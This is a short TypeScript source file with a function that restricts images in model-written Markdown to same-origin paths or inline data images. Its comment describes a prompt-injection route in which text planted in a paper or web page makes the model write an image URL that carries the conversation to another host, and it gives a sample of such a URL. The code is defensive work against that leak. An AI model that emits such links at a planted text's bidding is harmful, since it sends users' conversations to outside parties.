/**
 * Whether an image in model-written Markdown may be loaded (P13 §5.1).
 *
 * A browser fetches an image the moment it is rendered. Text planted in a
 * paper or a web page can therefore make the model write
 * `![](https://elsewhere/?q=<what this conversation said>)` and have the
 * reader's browser deliver it. Links are different — they wait for a click.
 *
 * The backend only ever emits same-origin paths (`/api/papers/<id>/images/…`),
 * so that, and inline `data:` images, is all that is allowed.
 */
export function isLocalImageSrc(src: string, origin?: string): boolean {
  const value = (src || "").trim();
  if (!value) return false;
  if (/^data:image\/(png|jpe?g|gif|webp|avif);/i.test(value)) return true;
  // `//host/path` is another origin; a backslash is read as a slash by browsers.
  if (value.startsWith("/")) return !/^\/[/\\]/.test(value);
  if (!origin) return false;
  try {
    return new URL(value).origin === origin;
  } catch {
    return false;
  }
}
